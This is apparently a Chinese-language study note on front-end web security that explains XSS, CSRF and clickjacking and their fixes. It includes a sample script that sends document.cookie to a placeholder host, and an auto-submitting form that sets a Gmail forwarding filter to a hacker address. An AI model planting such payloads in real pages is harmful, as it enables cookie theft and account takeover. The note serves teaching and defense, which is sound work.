---
{
  'title':'安全'
}
---

# 安全

## 网络安全攻击

- `XSS`Cross Site Scripting 跨站脚本攻击
- `CSRF`Cross-site request forgery 跨站请求伪造
- 点击劫持

### XSS

XSS(Cross Site Scripting跨站脚本)。XSS定义的主语是“脚本”，是一种跨站执行的脚本，也就是javascript脚本，指的是在网站上注入我们的javascript脚本，执行非法操作。
比如input框，文本编辑器输入一些内容

#### 场景

```html
<script>
  var img = document.createElement('img')
  img.src = 'http://xxx.com/api/xxx?info=' + document.cookie 
  //执行此代码，就会将攻击的cookie提交到自己制定的服务器中
</script>
```

#### 解决

- 替换字符串

```js
const newStr = str.replaceAll('<', '&lt;').replaceAll('>', '&gt;')
```

- 借助第三方工具
 <https://www.npmjs.com/package/xss>

#### Vue和React默认已屏蔽Xss攻击

但下面的场景会开启

- Vue `v-html`
- React `dangerouslySetInnerHTML`

### CSRF

CSRF（Cross-site request forgery跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。CSRF定义的主语是”请求“，是一种跨站的伪造的请求，指的是跨站伪造用户的请求，模拟用户的操作

#### 场景

请看下面的故事

- 小明登录了 Gmail 邮箱，收到一封广告邮件 “转让比特币，只要 998”
- 小明抱着好奇的心态点开看了看，发现是个空白页面，就关闭了
但此时，攻击已经完成了。黑客在这个空白页面设置了 js 代码，会让小明的邮件都转发到 `hacker@hackermail.com` 。<br>
因为小明已经登录了 Gmail ，有了 Gmail 的 cookie 。所以再去请求 Gmail API 就会带着 cookie ，就有可能成功。

```html
<form method="POST" action="https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf" enctype="multipart/form-data"> 
    <input type="hidden" name="cf2_emc" value="true"/> 
    <input type="hidden" name="cf2_email" value="hacker@hakermail.com"/> 
    .....
    <input type="hidden" name="irf" value="on"/> 
    <input type="hidden" name="nvp_bu_cftb" value="Create Filter"/> 
</form> 
<script> 
    document.forms[0].submit();

    // PS：有些是 post 请求，有些是 get 请求
    //     get 请求如果用 img.src 还可以规避跨域，更加危险
</script>
```

#### CSRF 的过程

- 用户登录了 `a.com` ，有了 cookie
- 黑客引诱用户访问 `b.com` 网页，并在其中发起一个跨站请求 `a.com/api/xxx`
- `a.com` API 收到 cookie ，误以为是真实用户的请求，就受理了

#### 解决cookie跨域

- 严格的跨域请求限制
- 为 cookie 设置 `SameSite` 不随跨域请求被发送 `Set-Cookie: key1=val1; key2=val2; SameSite=Strict;`
- 关键接口使用短信验证码等双重验证

### 点击劫持 Clickjacking

点击劫持的原理：黑客在自己的网站，使用隐藏的 `<iframe>` 嵌入其他网页，诱导用户按顺序点击。

钓鱼网站

使用 JS 预防

```js
if (top.location.hostname !== self.location.hostname) {
    alert("您正在访问不安全的页面，即将跳转到安全页面！")
    top.location.href = self.location.href
}
```

#### 解决

增加 http header `X-Frame-Options:SAMEORIGIN` ，让 `<iframe>` 只能加载同域名的网页。

PS：点击劫持，攻击那些需要用户点击操作的行为。CSRF 不需要用户知道，偷偷完成。

### ## SQL 注入
